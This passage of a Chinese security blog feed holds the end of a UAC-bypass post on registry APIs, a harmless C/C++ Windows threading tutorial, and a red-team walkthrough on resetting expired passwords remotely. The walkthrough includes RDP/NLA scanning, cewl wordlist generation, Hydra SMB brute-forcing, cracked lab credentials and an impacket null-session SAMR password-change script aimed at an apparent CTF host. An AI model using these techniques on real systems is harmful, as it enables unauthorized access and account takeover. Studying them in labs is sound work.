buffer);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="函数分析"><a href="#函数分析" class="headerlink" title="函数分析"></a>函数分析</h5><pre class="line-numbers language-none"><code class="language-none">hkey:根键盘的句柄lpSubKey:子键的名字Reserved:保留参数,必须为0lpClass:该键的用户定义类类型,可以忽略此参数,此参数可以为NULLdwOptions:有几个值,不适用置0即可,使用的时候具体查询samDesired:指定要创建的密钥的访问权限的掩码lpSecurityAttributes:指向SECURITY_ATTRIBUTES结构的指针phkResult:传出参数,新创建或打开的子键的句柄lpdwDisposition:有这个子键就-打开,没有就-创建<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RegSetValueExA"><a href="#RegSetValueExA" class="headerlink" title="RegSetValueExA"></a>RegSetValueExA</h4><p>RegSetValueEx是修改注册表项的函数</p><p>我们需要将它指向我们的exe路径</p><pre class="line-numbers language-none"><code class="language-none">LONG RegSetValueEx(  HKEY hKey,           // handle to key  LPCTSTR lpValueName, // value name  DWORD Reserved,      // reserved  DWORD dwType,        // value type  CONST BYTE *lpData,  // value data  DWORD cbData         // size of value data);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="函数分析-1"><a href="#函数分析-1" class="headerlink" title="函数分析"></a>函数分析</h5><pre class="line-numbers language-none"><code class="language-none">hkey:根键的句柄lpValueName:要设置的键值项Reserved:保留参数,必须为0dwType:lpData要设置的键值类型lpData:要设置的键值数据cbData:lpData参数指向的信息的大小,以字节为单位<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SHDeleteKey"><a href="#SHDeleteKey" class="headerlink" title="SHDeleteKey"></a>SHDeleteKey</h4><p>我们为了隐蔽性的考虑，最好是删除这个路径，那么就需要用到这个api</p><p>它可以删除一个注册表键，包括其下面的子键</p><pre class="line-numbers language-none"><code class="language-none">LONG WINAPI SHDeleteKey (  in HKEY hKey,  in LPCTSTR lpSubKey);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="函数分析-2"><a href="#函数分析-2" class="headerlink" title="函数分析"></a>函数分析</h5><pre class="line-numbers language-none"><code class="language-none">hkey:根键的句柄,必须要有DELETE权限lpSubKey:子键名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p>具体代码这里就不贴了</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134061.png" alt="image-20211031210753536"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134062.png" alt="image-20211031212947419"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134063.png" alt="image-20211031213047143"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202110312134064.png" alt="image-20211031213012919"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>希望可以帮到各位师傅！</p>]]></content>
      
      
      <categories>
          
          <category> BypassUAC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 白名单程序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>线程-编码篇(一)</title>
      <link href="/2021/10/28/xian-cheng-bian-ma-pian/"/>
      <url>/2021/10/28/xian-cheng-bian-ma-pian/</url>
      
        <content type="html"><![CDATA[<h1 id="线程编码实战"><a href="#线程编码实战" class="headerlink" title="线程编码实战"></a>线程编码实战</h1><p> 需要用到的函数：</p><pre class="line-numbers language-none"><code class="language-none">CreateThread_beginthreadexSetThreadPriorityExitThreadTerminateThreadExitProcess_endthreadex1.创建线程，无参  CreateThread  _beginthreadex2.创建线程，有参3.给线程函数传参4.设置优先级5.创建多个不同优先级线程6.在线程中添加对象，看线程退出时是否执行了析构函数7.ExitThread，_endthreadex线程，看线程退出时是否执行了析构函数8.TerminateThread线程，看线程退出时是否执行了析构函数9.ExitProcess进程，看线程退出时是否执行了析构函数<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CreateThread创建无参线程"><a href="#CreateThread创建无参线程" class="headerlink" title="CreateThread创建无参线程"></a>CreateThread创建无参线程</h2><p>其实有一个小技巧</p><p>当这个API中涉及到安全属性，说明它是一个内核对象</p><p>那么我们最后就需要<code>CloseHandle(参数);</code>，去关闭内核对象，使内核对象-1</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;DWORD WINAPI ThreadPro(LPVOID lpParam);int main(int argc, char* argv[]){DWORD dwThreadId = 0;HANDLE hThread;hThread = CreateThread(NULL, NULL, ThreadPro, NULL, 0, &amp;dwThreadId);CloseHandle(hThread);for (int i = 0; i &lt; 20; i++){printf("world\n");}system("pause");return 0;}DWORD WINAPI ThreadPro(LPVOID lpParam){for (int i = 0; i &lt; 20; i++){printf("hello\n");}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="beginthreadex创建无参线程-推荐"><a href="#beginthreadex创建无参线程-推荐" class="headerlink" title="_beginthreadex创建无参线程(推荐)"></a>_beginthreadex创建无参线程(推荐)</h2><p>注：记得包含头文件<code>#include &lt;process.h&gt;</code></p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;DWORD WINAPI ThreadProex(LPVOID lpParam);int main(int argc, char* argv[]){HANDLE hThreadex;unsigned int iThreadIdex;hThreadex = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadProex, NULL, 0, &amp;iThreadIdex);CloseHandle(hThreadex);for (int i = 0; i &lt; 200; i++){printf("world\n");}system("pause");return 0;}DWORD WINAPI ThreadProex(LPVOID lpParam){for (int i = 0; i &lt; 200; i++){printf("_beginthreadex\n");}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="整型、字符串、结构体创建有参线程"><a href="#整型、字符串、结构体创建有参线程" class="headerlink" title="整型、字符串、结构体创建有参线程"></a>整型、字符串、结构体创建有参线程</h2><p>注：数组名称本身就是一个地址，数组需要的是地址，直到遇到<code>\0</code>才会停止</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;DWORD WINAPI ThreadPro(LPVOID lpParam);DWORD WINAPI ThreadProex(LPVOID lpParam);typedef struct _redamancy{int x;int y;}Redamancy;int main(int argc, char* argv[]){DWORD dwThreadId = 0;HANDLE hThread;//1.int类型参数int x = 20;int y = 40;//2.char类型数组char str1[200] = "matrix";char str2[200] = "123456";//3.结构体Redamancy reda1 = { 4,5 };Redamancy reda2 = { 20, 80 };//1.int类型参数//hThread = CreateThread(NULL, NULL, ThreadPro, &amp;x, 0, &amp;dwThreadId);//2.char类型数组//hThread = CreateThread(NULL, NULL, ThreadPro, str1, 0, &amp;dwThreadId);//3.结构体hThread = CreateThread(NULL, NULL, ThreadPro, &amp;reda1, 0, &amp;dwThreadId);CloseHandle(hThread);HANDLE hThreadex;unsigned int iThreadIdex;//1.int类型参数//hThreadex = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadProex, &amp;y, 0, &amp;iThreadIdex);//2.char类型数组//hThreadex = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadProex, str2, 0, &amp;iThreadIdex);//3.结构体hThreadex = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadProex, &amp;reda2, 0, &amp;iThreadIdex);CloseHandle(hThreadex);for (int i = 0; i &lt; 200; i++){printf("world\n");}system("pause");return 0;}DWORD WINAPI ThreadPro(LPVOID lpParam){Redamancy* p = (Redamancy*)lpParam;for (int i = 0; i &lt; 200; i++){//1.int类型参数//printf("hello %d\n", *((int *)lpParam));//2.char类型数组//printf("hello %s\n", (char*)lpParam);//3.结构体printf("hello %d,%d\n", ((Redamancy*)lpParam)-&gt;x, ((Redamancy*)lpParam)-&gt;y);printf("hello %d,%d\n", p-&gt;x, p-&gt;y);}return 0;}DWORD WINAPI ThreadProex(LPVOID lpParam){Redamancy* p = (Redamancy*)lpParam;for (int i = 0; i &lt; 200; i++){//1.int类型参数//printf("_beginthreadex %d\n", *((int *)lpParam));//2.char类型数组//printf("hello %s\n", (char *)lpParam);//3.结构体printf("hello %d,%d\n", ((Redamancy*)lpParam)-&gt;x, ((Redamancy*)lpParam)-&gt;y);printf("_beginthreadex %d,%d\n", p-&gt;x, p-&gt;y);}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="对象创建有参线程"><a href="#对象创建有参线程" class="headerlink" title="对象创建有参线程"></a>对象创建有参线程</h2><p>注：记得添加头文件</p><pre class="line-numbers language-none"><code class="language-none">#include &lt;iostream&gt;using namespace std;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="string内置对象"><a href="#string内置对象" class="headerlink" title="string内置对象"></a>string内置对象</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;#include &lt;iostream&gt;using namespace std;DWORD WINAPI ThreadPro(LPVOID lpParam);DWORD WINAPI ThreadProex(LPVOID lpParam);int main(int argc, char* argv[]){DWORD dwThreadId = 0;HANDLE hThread;//对象string str1 = "matrix";string str2 = "123456";//指针类型的对象string *pStr3 = new string("redamancy");string *pStr4 = new string("654123");//对象//hThread = CreateThread(NULL, NULL, ThreadPro, &amp;str1, 0, &amp;dwThreadId);//指针类型的对象hThread = CreateThread(NULL, NULL, ThreadPro, pStr3, 0, &amp;dwThreadId);CloseHandle(hThread);HANDLE hThreadex;unsigned int iThreadIdex;//对象//hThreadex = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadProex, &amp;str2, 0, &amp;iThreadIdex);//指针类型的对象hThreadex = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadProex, pStr4, 0, &amp;iThreadIdex);CloseHandle(hThreadex);for (int i = 0; i &lt; 200; i++){printf("world\n");}system("pause");return 0;}DWORD WINAPI ThreadPro(LPVOID lpParam){string* p = (string*)lpParam;for (int i = 0; i &lt; 200; i++){//对象//cout:打印数据//endl:打印回车cout &lt;&lt; *p &lt;&lt; endl;}return 0;}DWORD WINAPI ThreadProex(LPVOID lpParam){string* p = (string*)lpParam;for (int i = 0; i &lt; 200; i++){//对象cout &lt;&lt; *p &lt;&lt; endl;}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="自定义对象"><a href="#自定义对象" class="headerlink" title="自定义对象"></a>自定义对象</h3><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;#include &lt;string&gt;#include &lt;iostream&gt;using namespace std;DWORD WINAPI ThreadPro(LPVOID lpParam);DWORD WINAPI ThreadProex(LPVOID lpParam);class Redamancy{public://构造函数Redamancy(int iX, int iY){m_iX = iX;m_iY = iY;}void printRedamancy(){cout &lt;&lt; m_iX &lt;&lt; "," &lt;&lt; m_iY &lt;&lt; endl;}private:int m_iX;int m_iY;};int main(int argc, char* argv[]){Redamancy reda1(4, 5);Redamancy reda2(20, 80);DWORD dwThreadId = 0;HANDLE hThread;hThread = CreateThread(NULL, NULL, ThreadPro, &amp;reda1, 0, &amp;dwThreadId);CloseHandle(hThread);HANDLE hThreadex;unsigned int iThreadIdex;hThreadex = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadProex, &amp;reda2, 0, &amp;iThreadIdex);CloseHandle(hThreadex);system("pause");return 0;}DWORD WINAPI ThreadPro(LPVOID lpParam){Redamancy* p = (Redamancy*)lpParam;p-&gt;printRedamancy();return 0;}DWORD WINAPI ThreadProex(LPVOID lpParam){Redamancy* p = (Redamancy*)lpParam;p-&gt;printRedamancy();return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="设置优先级"><a href="#设置优先级" class="headerlink" title="设置优先级"></a>设置优先级</h2><p>参考这里：<a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread</a></p><p>主要是这个参数<code>dwCreationFlagss</code></p><p>它有三个取值</p><pre class="line-numbers language-none"><code class="language-none">0                    创建完成后,立即执行线程CREATE_SUSPENDED     创建完成后,挂起线程，等待ResumeThread 唤醒线程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>那个取值 先不做分析</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261320222.png" alt="image-20211124191521967"></p><p>涉及到<code>ResumeThread</code> API</p><p>具体的定义</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread</a></p><pre class="line-numbers language-none"><code class="language-none">DWORD ResumeThread(  [in] HANDLE hThread);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>设置优先级 使用<code>SetThreadPriority</code> API</p><p>具体的定义</p><p><a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadpriority">https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadpriority</a></p><pre class="line-numbers language-none"><code class="language-none">BOOL SetThreadPriority(  [in] HANDLE hThread,    //句柄  [in] int    nPriority   //优先级选择);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>注：我们人为的干预了优先级，但是并不是没有机会</strong></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261320139.png" alt="image-20211124192847812"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111261320154.png" alt="image-20211124192905195"></p><pre class="line-numbers language-none"><code class="language-none">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;windows.h&gt;#include &lt;process.h&gt;DWORD WINAPI ThreadPro(LPVOID lpParam);DWORD WINAPI ThreadProex(LPVOID lpParam);int main(int argc, char* argv[]){DWORD dwThreadId = 0;HANDLE hThread;//挂起线程hThread = CreateThread(NULL, NULL, ThreadPro, NULL, CREATE_SUSPENDED, &amp;dwThreadId);//设置优先级SetThreadPriority(hThread, THREAD_PRIORITY_LOWEST);//唤醒线程ResumeThread(hThread);CloseHandle(hThread);HANDLE hThreadex;unsigned int iThreadIdex;hThreadex = (HANDLE)_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)ThreadProex, NULL, CREATE_SUSPENDED, &amp;iThreadIdex);SetThreadPriority(hThreadex, THREAD_PRIORITY_IDLE);ResumeThread(hThreadex);CloseHandle(hThreadex);system("pause");return 0;}DWORD WINAPI ThreadPro(LPVOID lpParam){for (int i = 0; i &lt; 200; i++){printf("hello\n");}return 0;}DWORD WINAPI ThreadProex(LPVOID lpParam){for (int i = 0; i &lt; 200; i++){printf("_beginthreadex\n");}return 0;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Windows核心编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 线程-编码篇(一) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>远程重置过期密码</title>
      <link href="/2021/10/28/yuan-cheng-chong-zhi-mi-ma/"/>
      <url>/2021/10/28/yuan-cheng-chong-zhi-mi-ma/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一个红队经常用到的小技巧，远程重置过期密码，这个在实战中太常见了</p><p>当我们找到有效的凭据，但密码却过期了</p><h2 id="远程桌面协议"><a href="#远程桌面协议" class="headerlink" title="远程桌面协议"></a>远程桌面协议</h2><p>注：需要 RDP 而不强制执行 NLA</p><p>我们需要找到一个不需要 NLA 的系统。并且不需要系统的权限</p><h3 id="nessus"><a href="#nessus" class="headerlink" title="nessus"></a>nessus</h3><p>可以在Nessus 扫描结果中查找：<code>终端服务不仅使用网络级身份验证 (NLA)</code></p><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>执行命令</p><pre class="line-numbers language-none"><code class="language-none">nmap x.x.x.x -p 3389 --script rdp-enum-encryption<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>关注：<code>SSL: SUCCESS</code>字段</p><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>使用<code>auxiliary(scanner/rdp/rdp_scanner)</code>模块</p><p>配置参数 扫描即可</p><pre class="line-numbers language-none"><code class="language-none">use auxiliary(scanner/rdp/rdp_scanner)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="rdesktop"><a href="#rdesktop" class="headerlink" title="rdesktop"></a>rdesktop</h3><p>rdesktop连接到目标系统，无需指定任何用户名或密码</p><p>执行命令</p><pre class="line-numbers language-none"><code class="language-none">rdesktop x.x.x.x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>需要键入yes，信任证书</p><p>可以重置密码，也可以返回到其他命令行工具</p><h2 id="smbpasswd"><a href="#smbpasswd" class="headerlink" title="smbpasswd"></a>smbpasswd</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>注：需要匿名访问 IPC$ 共享</p><p>smbpasswd可能是远程重置密码最简单方法，但是它有一些条件。</p><p>执行命令：</p><pre class="line-numbers language-none"><code class="language-none">smbpasswd -r 10.0.0.15 -U 'expired'#-r:远程主机IP#-U:用户名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><pre class="line-numbers language-none"><code class="language-none">1.首先尝试使用该帐户进行身份验证2.获取"密码已过期"消息3.匿名连接到 IPC$ 共享4.在这里执行密码重置<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：默认情况下，任何人都可以通过 IPC$ 匿名连接</p><p>但是，有时会出现 <code>IPC$不可访问</code>的情况，在这种情况下，这将不起作用</p><p>可能是 因为 IPC$ 仅限于 NULL会话的限制</p><h2 id="ChangePwd"><a href="#ChangePwd" class="headerlink" title="ChangePwd"></a>ChangePwd</h2><h3 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h3><p>注：需要访问 IPC$ Share 和 Windows，并且不需要任何管理员权限即可运行。</p><p>工具下载地址：<a href="https://www.joeware.net/freetools/tools/changepw/index.htm">https://www.joeware.net/freetools/tools/changepw/index.htm</a></p><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>它的工作方式与 smbpassword 非常相似</p><p>但是在与 IPC$ 的连接方面，如果它不执行匿名连接，它会使用当前登录的用户连接到 IPC$</p><p>在这种情况下，即使 IPC$ 仅限于 NULL 会话，只要我们有一个其他用户，仍然可以执行重置</p><h2 id="Impacket-smbpasswd"><a href="#Impacket-smbpasswd" class="headerlink" title="Impacket smbpasswd"></a>Impacket smbpasswd</h2><h3 id="前言-3"><a href="#前言-3" class="headerlink" title="前言"></a>前言</h3><p>注：需要 访问 IPC$ 共享</p><p>下载地址：<a href="https://github.com/snovvcrash/impacket/blob/smbpasswd/examples/smbpasswd.py">https://github.com/snovvcrash/impacket/blob/smbpasswd/examples/smbpasswd.py</a></p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>它与 smbpassword 基本相同，但在 Impacket 中，它是以非交互方式重新实现</p><p>问题：<a href="https://snovvcrash.rocks/2020/10/31/pretending-to-be-smbpasswd-with-impacket.html">https://snovvcrash.rocks/2020/10/31/pretending-to-be-smbpasswd-with-impacket.html</a> </p><p>我们不需要知道原始明文，有散列值就可以了</p><h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><h4 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h4><p>无法访问</p><p>根据跳转加hosts</p><pre class="line-numbers language-none"><code class="language-none">10.10.10.193 fuse.fabricorp.local<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111042008705.png" alt="image-20211104175155383"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111042008707.png" alt="image-20211104175319153"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111042008708.png" alt="image-20211104175403862"></p><p>整理用户名</p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111042008709.png" alt="image-20211104175536000"></p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111042008710.png" alt="image-20211104181812790"></p><pre class="line-numbers language-none"><code class="language-none">pmertontlavelsthompsonbhult   <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111042008711.png" alt="image-20211104181842505"></p><h4 id="smb匿名登录"><a href="#smb匿名登录" class="headerlink" title="smb匿名登录"></a>smb匿名登录</h4><pre class="line-numbers language-none"><code class="language-none">smbclient -L 10.10.10.193<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111042008712.png" alt="image-20211104182249618"></p><h4 id="cewl"><a href="#cewl" class="headerlink" title="cewl"></a>cewl</h4><p>使用cewl根据网页内容生成密码字典：</p><pre class="line-numbers language-none"><code class="language-none">cewl -d 5 -m 3 -w wordlist.txt http://fuse.fabricorp.local/papercut/logs/html/index.htm --with-numbers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Hydra-暴力破解密码"><a href="#Hydra-暴力破解密码" class="headerlink" title="Hydra 暴力破解密码"></a>Hydra 暴力破解密码</h4><pre class="line-numbers language-none"><code class="language-none">hydra -L user.txt -P wordlist.txt http://fuse.fabricorp.local smb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>得到两个用户名 和 密码</p><pre class="line-numbers language-none"><code class="language-none">tlavel:Fabricorp01bhult:Fabricorp01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="登录共享"><a href="#登录共享" class="headerlink" title="登录共享"></a>登录共享</h4><pre class="line-numbers language-none"><code class="language-none">smbclient -L 10.10.10.193 -U tlavel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111042008713.png" alt="image-20211104183655372"></p><p>无法直接使用，提示<code>NT_STATUS_PASSWORD_MUST_CHANGE</code></p><p>这里 我们的思路 就来了</p><h4 id="smbpasswd-1"><a href="#smbpasswd-1" class="headerlink" title="smbpasswd"></a>smbpasswd</h4><p>可以使用旧密码，通过smbpasswd修改密码，之后使用新密码，注意密码需要满足规则</p><pre class="line-numbers language-none"><code class="language-none">smbpasswd -r 10.10.10.193 -U tlavel<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功修改 </p><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111042008714.png" alt="image-20211104183939434"></p><p>注：通过 SMB 更改密码还可以使用 impacket 的 smbclient.py，但是当密码过期时它就不能用了</p><p>Samba 的<code>NetCommand</code>也是一样的，不能更改过期的密码</p><p>贴一个大佬的脚本</p><p>原理：通过一次对<a href="https://github.com/SecureAuthCorp/impacket/blob/2126aa130c26af96301cc6ce00230d1c41ee6809/impacket/dcerpc/v5/samr.py#L2774">hSamrUnicodeChangePasswordUser2 的</a>调用直接更改的密码</p><pre class="line-numbers language-none"><code class="language-none">#!/usr/bin/python3from argparse import ArgumentParserfrom impacket.dcerpc.v5 import transport, samrdef connect(host_name_or_ip):rpctransport = transport.SMBTransport(host_name_or_ip, filename=r'\samr')if hasattr(rpctransport, 'set_credentials'):rpctransport.set_credentials(username='', password='', domain='', lmhash='', nthash='', aesKey='') # null sessiondce = rpctransport.get_dce_rpc()dce.connect()dce.bind(samr.MSRPC_UUID_SAMR)return dcedef hSamrUnicodeChangePasswordUser2(username, oldpass, newpass, target):dce = connect(target)resp = samr.hSamrUnicodeChangePasswordUser2(dce, '\x00', username, oldpass, newpass)resp.dump()parser = ArgumentParser()parser.add_argument('username', help='username to change password for')parser.add_argument('oldpass', help='old password')parser.add_argument('newpass', help='new password')parser.add_argument('target', help='hostname or IP')args = parser.parse_args()hSamrUnicodeChangePasswordUser2(args.username, args.oldpass, args.newpass, args.target)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行命令</p><pre class="line-numbers language-none"><code class="language-none">python3 setsmbpasswd.py tlavel Fabricorp01 'Aaaa001!' 10.10.10.193<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111042008715.png" alt="image-20211104200718833"></p><p>进行登录</p><pre class="line-numbers language-none"><code class="language-none">smbclient -L 10.10.10.193 -U 'tlavel'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/202111042008716.png" alt="image-20211104200640482"></p><h2 id="SetADAccountPwd"><a href="#SetADAccountPwd" class="headerlink" title="SetADAccountPwd"></a>SetADAccountPwd</h2><p>注：需要 Windows 和 RSAT 工具，并且管理员权限才能在 Windows 上安装 RSAT 工具</p><p>工具下载地址：<a href="https://www.microsoft.com/zh-CN/download/details.aspx?id=45520">https://www.microsoft.com/zh-CN/download/details.aspx?id=45520</a></p><p>执行命令：</p><p>具体可以参考这里：<a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/set-adaccountpassword?view=windowsserver2019-ps">https://docs.microsoft.com/en-us/powershell/module/activedirectory/set-adaccountpassword?view=windowsserver2019-ps</a></p><h2 id="Powershell-脚本"><a href="#Powershell-脚本" class="headerlink" title="Powershell 脚本"></a>Powershell 脚本</h2><p>注：需要访问 IPC$ 